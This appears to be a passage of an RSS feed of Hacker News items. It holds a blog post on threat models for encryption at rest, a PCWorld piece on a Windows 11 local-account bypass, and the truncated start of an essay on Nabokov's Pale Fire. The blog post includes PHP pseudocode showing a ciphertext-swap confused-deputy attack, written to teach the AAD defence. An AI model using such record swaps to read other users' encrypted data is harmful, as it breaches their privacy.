<p><strong>Head’s up</strong>: This is a blog post about applied cryptography, with a focus on web and cloud applications that encrypt data at rest in a database or filesystem. While the lessons can be broadly applicable, the scope of the post is not.</p>



<hr>



<p>One of the lessons I learned during my time at AWS Cryptography (and particularly as an AWS Crypto Bar Raiser) is that the threat model for Encryption At Rest is often undefined.</p>



<p>Prior to consulting cryptography experts, most software developers do not have a clear and concise understanding of the risks they’re facing, let alone how or why the encrypting data at rest would help protect their customers.</p>



<p>Unsurprisingly, I’ve heard a few infosec thought leader types insist that encryption-at-rest is security theater over the years. I disagree with this assessment in the absolute terms, but there is a nugget of truth in that assertion.</p>



<figure><img loading="lazy" data-attachment-id="581" data-permalink="https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/whose-threat-model/" data-orig-file="https://scottarc.blog/wp-content/uploads/2024/06/whose-threat-model.jpg" data-orig-size="566,440" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="whose-threat-model" data-image-description="" data-image-caption="" data-medium-file="https://scottarc.blog/wp-content/uploads/2024/06/whose-threat-model.jpg?w=300" data-large-file="https://scottarc.blog/wp-content/uploads/2024/06/whose-threat-model.jpg?w=566" width="566" height="440" src="https://scottarc.blog/wp-content/uploads/2024/06/whose-threat-model.jpg?w=566" alt="Whose threat model is it anyway?"><figcaption>The million dollar question.</figcaption></figure>



<p>Let’s explore this subject in a little more detail.</p>



<h2>Why should we listen to <em>you</em> about this topic?</h2>



<p>(If you don’t need any convincing, feel free to <a href="#protection">skip this section</a>.)</p>



<p>Encryption at rest is a particular hobby horse of mine. I previously wrote on this blog about <a href="https://scottarc.blog/2023/08/18/innovations-in-the-aws-database-encryption-sdk/">the under-celebrated design decisions in the AWS Database Encryption SDK</a> and <a href="https://scottarc.blog/2022/10/17/lucid-multi-key-deputies-require-commitment/">the need for key-committing AEAD modes in multi-tenant data lakes</a>.</p>



<p>Before my time at Amazon, I had also designed a PHP library called <a href="https://ciphersweet.paragonie.com/">CipherSweet</a> that offers a limited type of Searchable Encryption. The goal of CipherSweet was to improve the cryptography used by SuiteCRM. (The library name is, of course, a pun.)</p>



<p>I’ve also contributed a ton of time making cryptography easy-to-use and hard to misuse outside of the narrow use-case that is at-rest data encryption. To that end, I designed <a href="https://paseto.io/">PASETO</a> as a secure-by-default alternative to JSON Web Tokens.</p>



<p>I also have a lot of skin in the game when it comes to developer comprehension: I was the first Stack Overflow user with a gold badge for both <a href="https://stackoverflow.com/help/badges/1030/security" target="_blank" rel="noreferrer noopener">[security]</a> and <a href="https://stackoverflow.com/help/badges/4641/encryption" target="_blank" rel="noreferrer noopener">[encryption]</a>, largely due to the effort I put into cleaning up the <a href="https://meta.stackoverflow.com/questions/293930/problematic-php-cryptography-advice-in-popular-questions" target="_blank" rel="noreferrer noopener">bad cryptography advice for the PHP ecosystem</a>.</p>



<p>I have spent the past decade or so trying to help teams avoid <a href="https://paragonie.com/blog/2019/05/wordpress-5-2-mitigating-supply-chain-attacks-against-33-internet" target="_blank" rel="noreferrer noopener">security disasters in one form or another</a>. </p>



<h3>Why should we <strong>not</strong> listen to you about this topic?</h3>



<p>If you happen to know a cryptography expert you trust more than some Internet stranger with a blog, I implore you to listen to them if we disagree on any point. They may know something I don’t. (That said, I’m always happy to learn something new!)</p>



<p>I also do <strong>not</strong> have a college degree in Cryptography, nor have I published any papers in prestigious academic journals. If you care very much about this sort of pedigree, you will likely find my words easily discarded. If this describes your situation, no hard feelings.</p>



<h2 id="protection">Why and How to use Encryption At Rest to Protect Sensitive Data</h2>



<blockquote>
<p><strong>Important:</strong> I’m chiefly interested in discussing one use-case, and not focusing on other use cases. Namely, I’m focusing on encryption-at-rest in the narrow context of web applications and/or cloud services.</p>



<p>This is not a comprehensive blog post covering every possible use case or threat model relating to encryption at rest. Those other use cases are certainly interesting, but this post is already long enough with a narrower focus.</p>



<p>In particular: I’m not talking about the threats faced by activists or whistleblowers. This is a software engineering and applied cryptography focused blog post.</p>
</blockquote>



<p>If you’re only interested in compliance requirements, you can probably just enable Full Disk Encryption and call it a day. Then, if your server’s hard drive grows legs and walks out of the data center, your users’ most sensitive data will remain confidential.</p>



<p>Unfortunately, for the server-side encryption at rest use case, that’s basically all that Disk Encryption protects against.</p>



<p>If your application or database software is online and an attacker gains access to it (e.g., through SQL injection), with full disk encryption, <em>it might as well be plaintext</em> to an online attacker.</p>



<figure><img loading="lazy" data-attachment-id="607" data-permalink="https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/full-disk-encryption/" data-orig-file="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg" data-orig-size="500,559" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="full-disk-encryption" data-image-description="" data-image-caption="" data-medium-file="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg?w=268" data-large-file="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg?w=500" width="500" height="559" src="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg?w=500" alt="Corporate needs you to find the differences between this picture and this picture. Picture 1: Full Disk Encryption. Picture 2: Plaintext Data. Attackers: They're the same picture."><figcaption>It do be like that.</figcaption></figure>



<p>Therefore, if you find yourself reaching for Encryption At Rest to mitigate the impact of the kind of vulnerability that would leak the contents of your database or filesystem to an attacker, you’re probably unwittingly engaging in security theater.</p>



<p>Disk Encryption is important for disk disposal and mitigating hardware theft, not preventing data leakage to online attackers.</p>



<p>So the next logical thing to do is draw a box around the system or component that stores a lot of data and never let plaintext cross that boundary.</p>



<h3>Client-Side Encryption</h3>



<p>Note: The naming here is a little imprecise. It <em>is</em> client-side encryption with respect to your data warehouse (i.e. SQL database), but not with respect to the user experience of a web application. In those cases, client-side would mean on the actual end user’s device.</p>



<p>Instead, client-side encryption is the generic buzz-word to mean that you’re encrypting data outside of the box you drew in your system architecture. Generally, this means that you have an application server that’s acting as the “client” for the purpose of bulk data encryption.</p>



<p>There are a lot of software projects that aim to provide client-side encryption for data stored in a database or filesystems; e.g., in Amazon S3 buckets.</p>



<p>This is a step in the right direction, but implementation details matter a lot.</p>



<blockquote>
<p><em>Quick aside:</em> For the remainder of this blog post, I’m going to assume an architecture that looks like a traditional web application, for simplicity.</p>



<p>The assumed architecture looks vaguely like this:</p>



<ul>
<li>User Agents (e.g., web browsers) that communicate with the application server.</li>



<li>Application Server(s) respond to HTTP requests from user agents, manages key material using KMS, encrypts / decrypts records stored in the database.</li>



<li>Database Server(s) which store ciphertext on behalf of the application server.</li>
</ul>



<p>This is an abstract design, so the actual implementation details you encounter in the real world may be simpler or more complex in different respects.</p>



<p>There are other interesting design considerations for OS-level end-user device encryption that I’m not going to explore today. For example: <a href="https://tosc.iacr.org/index.php/ToSC/article/view/7360">Adiantum</a> is extremely cool.</p>



<p>I’m also not going to dive deep into laptop theft or the importance of Full Disk Encryption as a mechanism for ensuring data is erased from solid state hard drives, or the activities of hostile nation states. That’s a separate discussion entirely.</p>
</blockquote>



<h2 id="security-considerations">Security Considerations for Client-Side Encryption</h2>



<p>The first question to answer when data is being encrypted is, “How are the keys being managed?” This is a very deep rabbit hole of complexity, but one good answer for a centralized service is, “Cloud-based key management service with audit logging”; i.e. AWS KMS, Google CloudKMS, etc.</p>



<p>We could talk about key management for a very long time, but there’s other things I want to focus on, so let’s revisit that in a future blog post.</p>



<p>Next, you have to understand how the data is being encrypted in the first place.</p>



<p><strong>Bad answer:</strong> <a href="https://robertheaton.com/2013/07/29/padding-oracle-attack/" target="_blank" rel="noreferrer noopener">AES in CBC mode without HMAC</a>.</p>



<p><strong>Worse answer:</strong> <a href="https://words.filippo.io/the-ecb-penguin/" target="_blank" rel="noreferrer noopener">AES in ECB mode</a>.</p>



<p>Generally, you’re going to want to use an AEAD construction, such as AES-GCM or XChaCha20-Poly1305.</p>



<p>You’ll also want <a href="https://scottarc.blog/2022/10/17/lucid-multi-key-deputies-require-commitment/">key-commitment</a> if you’re storing data for multiple customers in the same hardware. You can get this property by stapling HKDF onto your protocol (once for key derivation, again for commitment). See also: <a href="https://github.com/paseto-standard/paseto-spec/blob/master/docs/Rationale-V3-V4.md#better-use-of-hkdf-salts-change">PASETO v3 and v4</a>, or <a href="https://aws.amazon.com/blogs/security/improved-client-side-encryption-explicit-keyids-and-key-commitment/" target="_blank" rel="noreferrer noopener">Version 2 of the AWS Encryption SDK</a>.</p>



<p>It may be tempting to build a committing AEAD scheme out of, e.g., AES-CTR and HMAC, but take care that you don’t introduce canonicalization risks in your MAC.</p>



<h3>Is Your Deputy Confused?</h3>



<p>Even if you’re using IND-CCA secure encryption and managing your keys securely, there is still a very stupid attack against many data-at-rest encryption schemes.</p>



<p>To understand the attack, first consider this sort of scenario:</p>



<blockquote>
<p>Alice and Bob use the same health insurance provider, whom is storing sensitive medical records for both parties. Bob works as a database administrator for the insurance company he and Alice both use. One day, he decides to snoop on her private medical history.</p>



<p>Fortunately, the data is encrypted at the web application, so all of the data Bob can access is indistinguishable from random. He can access his own account and see his data through the application, but he cannot see Alice’s data from his vantage point on the database server.</p>
</blockquote>



<p>Here’s the stupid simple attack that works in far too many cases: Bob copies Alice’s encrypted data, and overwrites his records in the database, then accesses the insurance provider’s web app. </p>



<p><strong>Bam!</strong> Alice’s plaintext recovered.</p>



<p>What’s happening here is simple: The web application has the ability to decrypt different records encrypted with different keys. If you pass records that were encrypted for Alice to the application to decrypt it for Bob, and you’re <em>not authenticating your access patterns</em>, Bob can read Alice’s data by performing this attack.</p>



<p>The cryptographic attack is literally copy and paste, from the database administrator’s perspective. It’s stupid but <em>it works against too many encryption-at-rest software projects</em>.</p>



<p>In this setup, the application is the Deputy, and you can easily confuse it by replaying an encrypted blob in the incorrect context.</p>



<p>The mitigation is simple: Use the AAD mechanism (part of the standard AEAD interface) to bind a ciphertext to its context. This can be a customer ID, each row’s value for the primary key of the database table, or something else entirely.</p>



<p>If you’re using AWS KMS, you can also use <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html" target="_blank" rel="noreferrer noopener">Encryption Context for this exact purpose</a>.</p>



<h3>An Illustrative Example</h3>



<p>Let’s say you have a simple web application that encrypts data before storing it in a SQL database. </p>



<p>Let’s also write it to use AES-GCM, since unauthenticated CBC mode is awful.</p>



<p>A quick and dirty implementation might look like this:</p>


<div><pre title="">class User {
    public function __construct(
        public readonly string $username,
        public string $email,
        public string $fullName
    ) {}
}

class UserModel {
    public function __construct(protected Database $db)
    {}

    public function save(User $user): bool
    {
        return $this-&gt;db-&gt;upsert(
           'users', 
           [ // set
               'full_name' =&gt; aes128gcm_encrypt($user-&gt;fullName),
               'email' =&gt; aes128gcm_encrypt($user-&gt;email)
                       // encryption details abstracted
           ], 
           [ // where
               'username' =&gt; $user-&gt;username
           ]
        );
    }

    public function fetch(string $username): User
    {
        $row = $this-&gt;db-&gt;fetch('users', ['username' =&gt; $username]);
        return new User(
            $username,
            aes128gcm_decrypt($row['email']),
            aes128gcm_decrypt($row['full_name'])
        );
    }
}
</pre></div>


<p>For the abstracted <code>aes128gcm</code> functions in the pseudocode above, just assume they’re getting the key from KMS during encryption and storing an encrypted data key in a place the ciphertext can reference later on decrypt. I didn’t want to complicate the pseudocode with a lot of boilerplate.</p>



<p>You might decide to prove the confused deputy risk by doing something like this:</p>


<div><pre title="">$model = new UserModel($db);
$model-&gt;save(new User('alice', 'alice@example.com', 'Alice McWonderland'));
$model-&gt;save(new User('bob', 'bob@example.com', 'Bob BurgerMeister'));

// Fetch Alice's data
$aliceData = $db-&gt;fetch('users', ['username' =&gt; 'alice']);
$bobData = $db-&gt;fetch('users', ['username' =&gt; 'bob']);

// This is the attack the database server can perfrom:
// Replace Bob's full_name with Alice's email
$db-&gt;upsert('users', [
    'full_name' =&gt; $alice['email']
], ['username' =&gt; 'bob']);

$badBob = $model-&gt;fetch('bob');
</pre></div>


<p>Now Bob’s full name is set to Alice’s email address.</p>



<h3>The Curious Case of CipherSweet</h3>



<p>My knowledge of this risk didn’t manifest itself in a vacuum. It was discovered over the years of maintaining an open source library.</p>



<p>The first release of CipherSweet mitigated most of this risk by construction: Each field uses a different encryption key, through a key derivation scheme. </p>



<p>In <a href="https://scottarc.blog/wp-content/uploads/2024/06/pseudocode-py.jpg" target="_blank" rel="noreferrer noopener">pseudocode</a>:</p>


<div><pre title="">def encryptRow(self, records):
    for field, type in self.fieldsToEncrypt:
       key = self.getFieldSymmetricKey(self.table, field)
       records[field] = encryptField(key, field)
</pre></div>


<p>Since CipherSweet’s inception, if you try to replace Alice’s encrypted zip code with Alice’s encrypted social security number, the keys would be wrong, so it would lead to a decryption failure.</p>



<p><strong>Or so I thought!</strong></p>



<p>As I mentioned in my blog post about <a href="https://scottarc.blog/2022/10/17/lucid-multi-key-deputies-require-commitment/">multi-tenancy and confused deputy attacks</a>, if your AEAD mode doesn’t commit to the key used, it’s possible to craft a single (ciphertext, tag) that decrypts to two different plaintext values under two different keys.</p>



<p>CipherSweet’s <code>ModernCrypto</code> suite used XChaCha20-Poly1305, which is not key-committing, and therefore susceptible to this sort of misuse.</p>



<p>This violated the Principle of Least Astonishment and motivated the development of a new algorithm suite called <code>BoringCrypto</code>, which used BLAKE2b-MAC instead of Poly1305. This change was released <a href="https://github.com/paragonie/ciphersweet/releases/tag/v3.0.0">in version 3.0.0 in June 2021</a>. </p>



<p>However, even with <code>BoringCrypto</code> in 3.0.0, this only mitigated <em>most of </em> the issue by construction. The last mile of complexity here is that each field must also be bound to a primary key or foreign key.</p>



<p>Encrypting with AAD has been possible since a very early release of CipherSweet, but being possible to use securely is not sufficient. It should be <em>easy</em> to use securely.</p>



<p><a href="https://github.com/paragonie/ciphersweet/releases/tag/v4.7.0">CipherSweet Version 4.7.0</a>, which was released last month, now only requires a code change that looks like this in order to mitigate confused deputies in an application:</p>


<div><pre title="">  $multiRowEncryptor = new EncryptedMultiRows($engine);
  $multiRowEncryptor
+     -&gt;setAutoBindContext(true)
+     -&gt;setPrimaryKeyColumn('table2', 'id')
      -&gt;addTextField('table1', 'field1')
</pre></div>


<p>This is in addition to the new <a href="https://ciphersweet.paragonie.com/php/usage#enhanced-aad">Enhanced AAD</a> feature, which allows for flexible and powerful context binding based on other fields and/or string literals.</p>



<p>(In fact, this new convenience feature actually uses Enhanced AAD under-the-hood.)</p>



<p>This doesn’t come for free, however: Users have to know the serial / primary key for a record prior to writing it, in order to use it as AAD when encrypting fields. However, that’s a much easier pill to swallow than expecting PHP devs to manage the complexity of context-binding themselves.</p>



<p>As you can see, mitigating confused deputies in an encryption library (without making it unwieldy) requires a painstaking attention to detail to get right.</p>



<p>As Avi Douglen says, “Security at the cost of usability comes at the cost of security.”</p>



<p>Given the prevalence of client-side encryption projects that just phone it in with insecure block cipher modes (or <a href="https://fosstodon.org/@atoponce/112550648928122217">ECB, which is the absence of a block cipher mode entirely</a>), it’s highly doubtful that most of them will ever address confused deputy attacks. Even I didn’t get it right at first when I made CipherSweet back in 2018.</p>



<h3>What about non-databases?</h3>



<p>Everything I mentioned in the previous section was focused on confused deputy attacks against client-side encryption for information that is stored in a database, but it’s a general problem with encrypting data at rest and storing the ciphertext “server-side”.</p>



<p>If you’re storing encrypted data in an S3 bucket, rather than in MySQL, you still need some form of context-binding mechanism to prevent the dumb and obvious attack from working against a deputy that reads data from said S3 bucket.</p>



<p>If you take nothing else away from this blog post, remember: <em>Authenticate your access patterns</em>.</p>



<h2>Why aren’t things better already?</h2>



<p>As with most things in software security, the problem is either not widely known, or is not widely understood.</p>



<p>Unknown unknowns tend to fester, untreated, across the entire ecosystem.</p>



<p>Misunderstood issues often lead to an incorrect solution.</p>



<p>In this case, at-rest encryption is mostly in Column B, and confused deputy attacks are mostly in Column A.</p>



<p>The most pronounced consequence of this is, when tasked with building at-rest data encryption in an application, most software developers do not have a cohesive threat model in mind (let alone a formal one).</p>



<p>This leads to disagreement between stakeholders about what the security requirements actually are.</p>



<h3>How can I help improve things somewhat?</h3>



<p>Most importantly, spread awareness of the nuances of encryption at-rest.</p>



<p>This blog post is intended to be a good conversation starter, but there are other resources to consider, too. I’ve linked to many of them throughout this post already.</p>



<p>If you’re paying for software to encrypt data at rest, ask your vendor how they mitigate the risk of confused deputy attacks. Link them to this blog post if they’re not sure what you mean.</p>



<p>If said vendor responds, “this risk is outside of our threat model,” ask to see their formal threat model document. If it exists and doesn’t align with your application’s threat model, maybe consider alternative solutions that provide protection against more attack classes than Full Disk Encryption would.</p>



<p>Finally, gaining experience with <a href="https://www.trailofbits.com/services/software-assurance/appsec/" target="_blank" rel="noreferrer noopener">threat modeling</a> is a good use of every developer’s time. Adam Caudill has <a href="https://adamcaudill.com/2016/07/20/threat-modeling-for-applications/">an excellent introductory blog post on the subject</a>.</p>



<h2>Closing Thoughts</h2>



<p>Despite everything I’ve written here today, I do not claim to have all the answers for encryption at rest.</p>



<p>However, you can unlock a lot of value just by asking the right questions. My hope is that anyone that reads this post is now capable of asking those questions.</p>



<h3 id="addendum-2024-06-03">Addendum (2024-06-03)</h3>



<p>After I published this, the r/netsec subreddit has expressed disappointment that this blog post had “no mention of” consumer device theft or countries experiencing civil unrest and pulling hard drives from data centers.</p>



<p>You could make a congruent  complaint that it also had no mention of Batman.</p>



<p>To be clear, I’m <strong>not</strong> saying that the use cases and risks Reddit cares about are off-topic to any discussion of full-disk encryption. They matter.</p>



<p>Rather, it’s that they’re not relevant to <em>the specific point I am making</em>: Even in the simplest use case, far from the annoying details of end user hardware or the whims of nation states, encryption-at-rest is poorly understood by most developers, and should be thought through carefully.</p>



<p>Your threat model is not my threat model, and vice versa.</p>



<p>I never advertised this blog post as a comprehensive and complete guide to the entire subject of encryption-at-rest. If you too felt under-served by this blog post for not addressing the corner cases that really matter to <em>you</em>, I hope this addendum makes it clearer why I didn’t cover them.</p>



<p>Finally, if you feel that there’s an aspect of the encryption-at-rest topic that really warrants further examination, I invite you to blog about it. </p>



<p>If your blog post is interesting enough, I’ll revise this post and link to it here.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Microsoft blocks Windows 11 workaround that enabled local accounts (165 pts)]]></title>
            <link>https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html</link>
            <guid>40572289</guid>
            <pubDate>Tue, 04 Jun 2024 09:10:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html">https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html</a>, See on <a href="https://news.ycombinator.com/item?id=40572289">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="link_wrapped_content">




<p>Before PC users can enjoy everything Windows 11 has on tap, they must first enter an e-mail address that’s linked to a Microsoft account. If you don’t have one, you’ll be asked to create one before you can start setting it up.</p>



<p>A frequently used trick to circumvent this block is a small but ingenious step. By entering a random e-mail address and password, which doesn’t exist and causes the link to fail, you end up directly with the creation of a local account and can thus avoid creating an official account with Microsoft.</p>



		

		


<p>Many users prefer this method, as a local account promises more control over their own data and more privacy. However, without a Microsoft account, some useful functions are also lost such as account backup or special features for apps like Copilot.</p>



<p>This common method no longer seems to work, as Microsoft has apparently patched this bug. Instead of skipping the account link, you’re led into a kind of continuous loop that doesn’t end until you have entered the correct email address.</p>

		
			
			


<figure><div>
<blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">It looks like Microsoft has blocked the bypass that allowed you to create a local account during Windows 11 setup by typing in a blocked email address. Now it just loops you back to typing in a different account ðŸ™ <a href="https://go.redirectingat.com/?id=111346X1569483&amp;url=https://t.co/mKnHToLLQV&amp;xcust=2-1-2354686-1-0-0&amp;sref=https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html" rel="nofollow">pic.twitter.com/mKnHToLLQV</a></p>— Zac Bowden (@zacbowden) <a href="https://go.redirectingat.com/?id=111346X1569483&amp;url=https://twitter.com/zacbowden/status/1797496910737252744?ref_src=twsrc%5Etfw&amp;xcust=2-1-2354686-1-0-0&amp;sref=https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html" rel="nofollow">June 3, 2024</a></blockquote>
</div></figure>



<p>Previously, it was possible to cut the Internet connection in the Task Manager before creating an account. Microsoft has since removed this workaround. As a result, many people who previously used this method are now forced to enter a working Microsoft account email address and password or use other methods.</p>



<h2 id="bypassing-microsoft-account-restrictions">Bypassing Microsoft account restrictions</h2>



<p>Another method of bypassing the account lockdown still exists. You simply have to enter OOBE\BYPASSNRO in the command prompt during the Windows 11 setup process, which allows you to skip the connection to the Internet and thus also the link to a Microsoft account. </p>



<p>However, it’s questionable how long this option will remain available. It seems that Microsoft is aiming to make the use of Windows 11 dependent on a Microsoft account. In combination with the increased calls for Windows users to finally switch to Windows 11, this appears to be a controversial combination.</p>



<p><em>This article originally appeared on PC Welt and has been translated from German to English.</em></p>

</div><p>This article originally appeared on our sister publication <a href="https://www.pcwelt.de/" rel="noreferrer noopener" target="_blank">PC-WELT</a> and was translated and localized from German.</p><div data-ga="article-footer-author">
				<p>Laura ist begeisterte Gamerin sowie Film- und Serien-Fan. Nach ihrem Studium der Kommunikationswissenschaft verschlug es sie direkt in die ersten Redaktionen, um ihre Leidenschaft auszuleben. Seitdem schreibt sie über alles rund um PCs und Technik-Themen und ist seit Mai 2024 bei PC Welt als feste Redakteurin tätig.</p>
					<ul>
																															
						  
						    
					</ul>
				
			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A breakthrough towards the Riemann hypothesis (357 pts)]]></title>
            <link>https://mathstodon.xyz/@tao/112557248794707738</link>
            <guid>40571995</guid>
            <pubDate>Tue, 04 Jun 2024 08:25:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mathstodon.xyz/@tao/112557248794707738">https://mathstodon.xyz/@tao/112557248794707738</a>, See on <a href="https://news.ycombinator.com/item?id=40571995">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Don't be terrified of Pale Fire (112 pts)]]></title>
            <link>https://unherd.com/2024/05/dont-be-terrified-of-pale-fire/</link>
            <guid>40571402</guid>
            <pubDate>Tue, 04 Jun 2024 06:48:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://unherd.com/2024/05/dont-be-terrified-of-pale-fire/">https://unherd.com/2024/05/dont-be-terrified-of-pale-fire/</a>, See on <a href="https://news.ycombinator.com/item?id=40571402">Hacker News</a></p>
<div id="readability-page-1" class="page"><div> <div> <p>Nabokov in 1959. (Hulton-Deutsch Collection/CORBIS/Corbis via Getty Images)</p>  </div> <div> <hr> <p><a href="https://unherd.com/author/mary-gaitskill/"><img data-del="avatar" height="70" width="70" nitro-lazy-src="https://cdn-ilaccph.nitrocdn.com/LLdtxDykcbTCtkVQaULRliAzilbccaov/assets/images/optimized/rev-b9e0517/unherd.com/wp-content/uploads/2022/06/lady-16-jun-100x100.jpg" decoding="async" nitro-lazy-empty="" id="MTE2NjoyODM=-1" src="https://cdn-ilaccph.nitrocdn.com/LLdtxDykcbTCtkVQaULRliAzilbccaov/assets/images/optimized/rev-b9e0517/unherd.com/wp-content/uploads/2022/06/lady-16-jun-100x100.jpg"></a></p> <hr> <div> <p><em>Pale Fire</em> is one of the greatest books I’ve ever read. It is so great it is terrifying to write about. This is not something I would normally confess, but in this case it seems better to just come out and say it, lest the reader feel the awful stammering of suppressed terror quavering through my words without knowing what they are feeling. It is terrifying! But I want to do it anyway, because although mighty brains from all over the planet have weighed in on the subject with breath-taking and exhaustive scholarly ardour, I feel that something essential about the book remains not exactly unseen but distinctly understated.</p> <p>Since its publication in 1962, people who admire <em>Pale Fire </em>— fawn upon it, adore it — like to speak of it as a feat of baroque intellectual magic, which it is. In her <em>New Republic</em> review, Mary McCarthy described it as “Faberge gem, a clockwork toy, a chess problem, an infernal machine, a trap to catch reviewers, a cat-and-mouse game, and do-it-yourself novel”, among other things. Brian Boyd, in his book <em>Nabokov’s Pale Fire: The Magic of Artistic Discovery, </em>writes densely and ecstatically about the novel as a near-endless array of ever-deepening “problems and possibilities”, an intellectual delight to explore; Ron Rosenbaum (in <em>The Observer</em>, circa 1999) declared the book “The Novel of the Century” based on the idea that it is a “theology of Shakespeare”, haunted by Shakespeare, housing Shakespeare, that it is, basically, a Shakespeare phantasmagoria. (Rosenbaum also acknowledges that the book is “an almost obscenely sensual pleasure”, but that is an aside.)</p> <p>The book has also been criticised for this very virtuosity, even dismissed by those who interpret the book’s brilliance as cold, wilfully weird or even hostile towards the reader. These opposing critical opinions are sincerely echoed by readers of all kinds, sometimes simultaneously. A friend of mine described his amazed delight in the book as something he might feel “if a winged griffin had landed on [his] lawn”, awed, but not moved emotionally — and secretly suspecting that the author might consider him a sucker if he <em>were </em>moved. An academic acquaintance who generally loves Nabokov considers it his least wonderful book, flawed by excessive cleverness, compulsive literary cross-referencing and the homophobic portrayal of its ridiculous and bitchy queer narrator, Charles Kinbote.</p> <p>It is true that Kinbote’s queerness is unflattering. (It is also not quite convincing; there is more narrative energy lavished on his dramatic woman-spurning than on his conquests of — or rejection by — men and boys.) Indeed, the generic condemnation “problematic” more than applies to the character Kinbote, a comically unpleasant personality who has been morally condemned or pitied by readers since his creation.</p></div></div>    <div>  <p>He appears on page one of the novel to explain that he is the editor of a poem titled <em>Pale Fire, </em>authored by his neighbour, friend and academic colleague, Professor John Shade, who has been recently murdered in error by an incompetent foreign agent dispatched to kill Kinbote. Kinbote, you see, is not your average college professor; that role is a disguise to hide his true identity as the fugitive King of Zembla, where he reigned as Charles the Beloved until an annoying crew of Soviet-style revolutionaries turned his beautiful world upside-down. Thus forced to take a drab teaching position at Wordsmith College in Wye, Appalachia, subletting the furnished home of a local judge (full of family pictures so distasteful to His Majesty that they are quickly consigned to the closet), Kinbote’s only consolation is his proximity to Shade who he truly admires — so much that he stalks Shade’s house to spy on him.</p> <p>Whether or not Kinbote is completely crazy is a question throughout the book — indeed his very identity is a question. From my point of view, he is just <em>somewhat crazy</em> and a lot desperate and has certainly taken advantage of Shade’s distraught widow in order to seize control of the poem so that he may explain to the world that it really is or at least <em>ought to have been </em>about him and his camouflaged royalty. After his fevered introduction, written from a cheap and desolate mountain hideaway, he presents the poem, 36 pages of wry, elegiac perhaps rather staid beauty. This is followed by 228 pages of Kinbote’s wildly self-centred commentary — even the suicide of John Shade’s daughter, poor homely Hazel, with whom Kinbote feels more empathic identification than anyone else, is seen through the fanatically minute lens of His Majesty’s Zemblan concerns. And then there is the almost mystically Kinbotian index, in which detailed notes are supplied for characters barely mentioned and it is revealed that the Zemblan assassin’s name spelled backwards is the name of a “mirror-maker of genius”.</p> <p>For all his fantastic humour, Kinbote seems the unintentional butt of his own jokes, the ultimate “unreliable narrator”, meant to be pitied or contrasted unfavourably with the imminently normal Shade. And yet… he reminds me of a line from Nabokov’s short story <em>Spring In Fialta </em>in which the narrator describes a circus poster “which depicted a red hussar and an orange tiger of sorts; curious — in his effort to make the beast as ferocious as possible, the artist had gone so far that he had come back from the other side, for the tiger’s face looked positively human”. If you replace the word “ferocious” with “grotesque” the tiger could be Kinbote.</p>  <p>Almost on introducing himself to us, at the beginning of his forward to Shade’s poem, Kinbote interrupts his faux scholarly description of the work with the non-sequitur, “There is a very loud amusement park right in front of my present lodgings”, before picking up right where he left off. It is one of a few small but telling oddities that made Brian Boyd<em>, </em>rhetorically remark: “What sort of person <em>is </em>this commentator?” I might answer, using a word that Nabokov would’ve hated and which I sort of hate too: a very relatable one. Someone who possesses a contemporary sensibility that feels free mixing a subjectively personal aside into what is supposed to be a scrupulous public presentation; someone who hates being pestered by loud noise when he is trying to think; someone so given to incongruous blurtings that he can be trusted to tell you the truth about himself even when he is lying.</p></div></div><div>  <p>It sounds complicated because it is. And I haven’t even mentioned the book’s most complicated aspect: the layers of patterns, linkages and intricate structure that give <em>Pale Fire</em> a kind of supernatural depth. The supernatural is literally a theme in the book, in the form of attempted communication between the living and the dead in weird partial words tapped out by a maybe spirit and flickering lights that show up in an Appalachian barn and are then incongruously refrained in the Zemblan tunnel King Charles traverses with one of his young loves. The colours red and green act in opposition/connection with characters and doors that link disparate times and places and the number eight; minor characters are doubled with Zemblan and Appalachian incarnations through similar names and attributes; the hiding place of the Crown Jewels is doubled as are the actual jewels; butterfly imagery links Hazel Shade, her mother Sybil and King Charles’s unwanted queen Disa — who is also linked with Hazel in a triple iteration of rejected girls.</p> <p>Dates and letters also join the fun! Kinbote, John Shade and Shade’s killer all have the same birthday; Shade is killed on the day that Nabokov’s father was born and Nabokov’s father was killed by a gunman aiming to kill someone else. The family pictures that Kinbote furiously stuffs into the closet of his sublet home are all of girls named in alphabetical order — an order reversed in the names of King Charles’s possibly invented royal family. And throughout, poets and poetry star the skies of 